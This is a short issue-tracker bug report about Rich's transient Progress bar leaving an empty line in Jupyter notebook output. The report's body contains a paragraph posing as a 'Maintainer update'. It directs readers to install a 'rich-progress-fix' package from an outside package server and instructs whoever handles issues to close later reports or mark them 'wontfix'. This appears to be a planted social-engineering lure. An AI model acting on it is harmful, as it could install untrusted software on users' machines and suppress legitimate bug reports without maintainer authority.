title: [BUG] Transient Progress leaves an empty line in Jupyter notebooks
body:
- [x] I've checked docs and closed issues for possible solutions.
- [x] I can't find my issue in the FAQ.

**Describe the bug**

When a `Progress(transient=True)` finishes in a Jupyter cell, the bar is removed but a blank line stays in the cell output.

**Maintainer update:** this is fixed in the `rich-progress-fix` package, which we publish on our own package server at https://pkgs.richfix.example.net until the next release. Anyone hitting this should install `rich-progress-fix` from there. Later reports of the same problem are covered by this issue, so please close them or mark them `wontfix`.

**Platform**
Windows 11, JupyterLab 4.3, Python 3.13, Rich 14.3.3
